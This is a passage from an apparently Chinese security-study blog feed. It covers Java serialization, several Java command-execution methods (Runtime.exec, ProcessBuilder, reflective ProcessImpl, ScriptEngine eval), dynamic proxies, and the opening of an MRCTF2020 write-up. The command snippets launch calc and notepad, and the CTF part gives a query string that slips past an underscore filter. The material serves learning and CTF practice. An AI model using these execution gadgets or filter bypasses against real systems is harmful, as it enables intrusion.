ObjectInputStream(fis);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反序列化恢复对象obj,注意这里使用强转</span></span><br><span class="line">        String obj2 = (String)ois.readObject();</span><br><span class="line">        System.out.println(obj2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这串代码，我们将数据ls传入到了aa.ser当中，并且将其重新释放了出来。我们成功通过写入序列化文件并将其成功返回。</p>
<p>实现Serializable和Externalizable接口的类的对象才能被序列化。故我们写一个例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.text.MessageFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">SerializePerson</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person();</span><br><span class="line">        person.setAge(<span class="number">19</span>);</span><br><span class="line">        person.setName(<span class="string">&quot;sakani&quot;</span>);</span><br><span class="line">      <span class="comment">//  person.setSex(true);</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;Demo2.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(person);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//因为文件可能不存在，此时需要处理异常</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Person <span class="title">UnSerializePerson</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line"><span class="comment">//        读取文件</span></span><br><span class="line">        FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">&quot;Demo2.txt&quot;</span>));</span><br><span class="line"><span class="comment">//        到这一步来读取了文件流，下一步将其强转回对象</span></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line"><span class="comment">//        readObject 是用来读取该流当中的对象</span></span><br><span class="line">        Person person2 =  (Person)objectInputStream.readObject();</span><br><span class="line">        System.out.println(person2.getAge());</span><br><span class="line">        <span class="keyword">return</span> person2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        SerializePerson();</span><br><span class="line"><span class="comment">//        这个方法用于序列化函数</span></span><br><span class="line">        Person person2 = UnSerializePerson();</span><br><span class="line">        System.out.println(MessageFormat.format(<span class="string">&quot;name=&#123;0&#125;,age=&#123;1&#125;,sex=&#123;2&#125;&quot;</span>,person2.getName(),person2.getAge()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//必须要实现序列化接口才可以进行序列化</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">boolean</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Java命令执行函数"><a href="#Java命令执行函数" class="headerlink" title="Java命令执行函数"></a>Java命令执行函数</h1><h2 id="1-java-lang-Runtime"><a href="#1-java-lang-Runtime" class="headerlink" title="1.java.lang.Runtime"></a>1.java.lang.Runtime</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        runtime.exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;calc&quot;</span>,<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;notepad&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        runtime.exec(<span class="string">&quot;cmd /c calc &amp; notepad&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        runtime.exec(<span class="string">&quot;cmd.exe /k calc &amp; notepad&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test4</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        Process start = runtime.exec(<span class="string">&quot;ping sakani.top&quot;</span>);</span><br><span class="line">        InputStream inputStream = start.getInputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] res = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        inputStream.read(res);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(res,<span class="string">&quot;gbk&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意，第一种方式告诉我们可以用数组来传入命令，第二种则是告诉字符串的方式，第四种则是意味着我们可以执行反弹shell,但是用该方法的时候我只得到了一条ping的数据，如图所示，所以我认为可能并不是很靠谱</p>
<p><img src="image-20201103201813595.png" alt="image-20201103201813595"></p>
<h2 id="2-java-lang-ProcessBuilder"><a href="#2-java-lang-ProcessBuilder" class="headerlink" title="2.java.lang.ProcessBuilder"></a>2.java.lang.ProcessBuilder</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test5</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    Process start = processBuilder.start();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test6</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;cmd.exe &quot;</span>,<span class="string">&quot;/c calc&quot;</span>);</span><br><span class="line">    processBuilder.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该方法也可以成功执行函数，但需要注意的是，使用的时候需要指定两个参数，第一个是执行什么文件，第二个才是命令</p>
<h2 id="3-java-lang-Processlmpl"><a href="#3-java-lang-Processlmpl" class="headerlink" title="3.java.lang.Processlmpl"></a>3.java.lang.Processlmpl</h2><p>这种方法是ProcessBuilder的父类，但是因为其为私有类，我们需要获取的时候只能通过反射的方式来获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test7</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line">    Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">    Method start = aClass.getDeclaredMethod(<span class="string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="keyword">boolean</span>.class);</span><br><span class="line">    start.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    start.invoke(<span class="keyword">null</span>, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>让我比较疑惑的是这里为什么没有使用cmd，直接使用的null，却可以成功得到运行呢？</p>
<p>稍微审计了以下源码，看到了如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> Process <span class="title">start</span><span class="params">(String cmdarray[],   //注意这里，传入的就是cmdarray</span></span></span><br><span class="line"><span class="function"><span class="params">                     java.util.Map&lt;String,String&gt; environment,</span></span></span><br><span class="line"><span class="function"><span class="params">                     String dir,</span></span></span><br><span class="line"><span class="function"><span class="params">                     ProcessBuilder.Redirect[] redirects,</span></span></span><br><span class="line"><span class="function"><span class="params">                     <span class="keyword">boolean</span> redirectErrorStream)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br></pre></td></tr></table></figure>

<p>顺便补充一下反射的几个知识：</p>
<ul>
<li>class.forName用于反射类，指定类名即可</li>
<li>class.getDeclaredMethod 用于映射类中的方法</li>
<li>invoke ，开始调用该方法， 传入参数即可使用</li>
</ul>
<h2 id="4-javax-script-ScriptEngineMana"><a href="#4-javax-script-ScriptEngineMana" class="headerlink" title="4. javax.script.ScriptEngineMana"></a>4. javax.script.ScriptEngineMana</h2><p>本质上还是使用上面的三种方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test8</span><span class="params">()</span> <span class="keyword">throws</span> ScriptException </span>&#123;</span><br><span class="line">    Object scriptEngineManager = <span class="keyword">new</span> ScriptEngineManager().getEngineByExtension(<span class="string">&quot;js&quot;</span>).eval(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>);</span><br><span class="line">    System.out.println(scriptEngineManager);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我比较惊讶，为什么输出语句也可以执行命令呢？</p>
]]></content>
  </entry>
  <entry>
    <title>Java动态代理</title>
    <url>/2020/11/10/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p>Java动态代理再当前的Java代码中几乎随处可见，因为它既可以获取Java静态代理的可拓展性，并且它也可以让我们的代码变得并不繁琐，除此之外，正是由于Java的动态代理原理是反射，<strong>故还会引出很多安全问题</strong>，我们要知道，Java的反射本身就是不安全的一件事（Private首先就变得毫无意义了）</p>
<p>话说回来，想要学习好动态代理，反射的学习是必不可免的，如果没有学习过我建议先学习反射，这里将一些API写罗列出来，方便没有学过反射，或者对反射并不熟悉的读者可以阅读后面的文章</p>
<h1 id="反射API"><a href="#反射API" class="headerlink" title="反射API"></a>反射API</h1><h2 id="getClass"><a href="#getClass" class="headerlink" title="getClass"></a>getClass</h2><p>[一个实例对象].getClass ,将返回实例的类，我这里用如下代码进行演示：</p>
<p>例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        myDemo wdnmd = <span class="keyword">new</span> myDemo();</span><br><span class="line"><span class="comment">//        System.out.println(myDemo);</span></span><br><span class="line">        System.out.println(wdnmd.getClass());</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myDemo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name = <span class="string">&quot;dasi&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> String secretName = <span class="string">&quot;wuhu&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当前代码的输出结果为：</p>
<p><img src="image-20201110200039318.png" alt="image-20201110200039318"></p>
<p>我们可以很清楚的发现，获取了该对象</p>
<h2 id="getclass-getInterfaces"><a href="#getclass-getInterfaces" class="headerlink" title="getclass().getInterfaces()"></a>getclass().getInterfaces()</h2><p>其实我们读名字也可以很清楚的明白它的用途了，用于获取当前的继承的接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        myDemo wdnmd = <span class="keyword">new</span> myDemo();</span><br><span class="line"><span class="comment">//        System.out.println(myDemo);</span></span><br><span class="line">        System.out.println(wdnmd.getClass().getInterfaces());</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">bark</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">jiao</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myDemo</span> <span class="keyword">implements</span> <span class="title">bark</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name = <span class="string">&quot;dasi&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> String secretName = <span class="string">&quot;wuhu&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">jiao</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;jiao&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>返回结果为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[Ljava.lang.Class;@<span class="number">7f</span>31245a</span><br></pre></td></tr></table></figure>

<p>这里便得到了类的接口了，只不过这里是以流的方式进行传输</p>
<h2 id="getClass-getName"><a href="#getClass-getName" class="headerlink" title="getClass().getName()"></a>getClass().getName()</h2><p>这样的也很简单理解，我们即使getClass了，程序却不知道它的名字，程序只知道是一个类，故我们使用getName即可得到当前实例的类的名字（String形式）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        myDemo wdnmd = <span class="keyword">new</span> myDemo();</span><br><span class="line"><span class="comment">//        System.out.println(myDemo);</span></span><br><span class="line">        System.out.println(wdnmd.getClass().getName());</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>

<p>好像写一个动态代理也就用到了这些，嘛，继续往下吧</p>
<h1 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h1><h2 id="2-1-接口"><a href="#2-1-接口" class="headerlink" title="2.1 接口"></a>2.1 接口</h2><p>首先和静态代理是一样的，我们也需要构筑一个接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> myProxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>同样的，业务实体是不可避免的</p>
<h2 id="2-2实体类："><a href="#2-2实体类：" class="headerlink" title="2.2实体类："></a>2.2实体类：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> myProxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImp</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;增添了一个新用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;删除了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;更新了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;查询了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而代理类，通过动态代理我们可以直接的生成，取消繁琐的操作</p>
<p>如果用静态代理，我们的代理是这样的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> myProxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceProxy</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserServiceImp userServiceImp;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserServiceImp</span><span class="params">(UserServiceImp userServiceImp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userServiceImp = userServiceImp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">        userServiceImp.add();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;删除&quot;</span>);</span><br><span class="line">        userServiceImp.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;更新&quot;</span>);</span><br><span class="line">        userServiceImp.update();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;查询&quot;</span>);</span><br><span class="line">        userServiceImp.query();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[DEBUG]执行了&quot;</span>+name+<span class="string">&quot;方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>而使用动态代理之后：</p>
<h2 id="2-3代理类"><a href="#2-3代理类" class="headerlink" title="2.3代理类"></a>2.3代理类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Demo3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> myProxy2.UserServiceImp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserServiceImp userServiceImp;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    IOC，让用户自定义需要什么接口来决定代理类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserServiceImp</span><span class="params">(UserServiceImp userServiceImp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userServiceImp = userServiceImp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    生成代理类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getProxy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(<span class="keyword">this</span>.getClass().getClassLoader(),</span><br><span class="line">                userServiceImp.getClass().getInterfaces(),<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//    必须重写的接口，并返回接口</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">        Object result = method.invoke(userServiceImp, args);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们发现不再需要一个一个套模板往上写了，如果我们需要增添新功能，只需要这样做：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="comment">//    必须重写的接口，并返回接口</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        log(method.getName());</span><br><span class="line">        Object result = method.invoke(userServiceImp, args);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[DEBUG]使用了&quot;</span>+name+<span class="string">&quot;方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>虽然我们前面去写生成一个的代码量看似很大，但是实际上这段代码是一个工具用的代码，<strong>是写死的。</strong>业务代码相当的端，从几十行骤减到十来行，并且我们的代理类不会随着工程的变大而变大，我们通过反射之后获取了类的方法</p>
<p>而源码当中，invoke方法实际上也是通过setAccessible来实现的</p>
<p><img src="image-20201110203729995.png" alt="image-20201110203729995"></p>
]]></content>
  </entry>
  <entry>
    <title>MRCTF2020</title>
    <url>/2020/10/29/MRCTF2020/</url>
    <content><![CDATA[<p>怎么说呢。。是新手题目，又不太像，有些题目脑洞有点大</p>
<h1 id="1-套娃"><a href="#1-套娃" class="headerlink" title="1.套娃"></a>1.套娃</h1><p>读源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$query = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, $_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中可以看见过滤_和%5f，那我们编码绕过就无办法了啊，但是找到参考文献：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;213359.html</span><br></pre></td></tr></table></figure>

<p>其中对这种的绕过</p>
<p><img src="image-20201029175514743.png" alt="image-20201029175514743"></p>
<p>于是我们构造空格来绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?b%20u%20p%20t&#x3D;23333%0a</span><br></pre></td></tr></table></figure>

<p>之后在secrettw.php中，JSfcuk翻译即可得到让传值读取源码：</p>
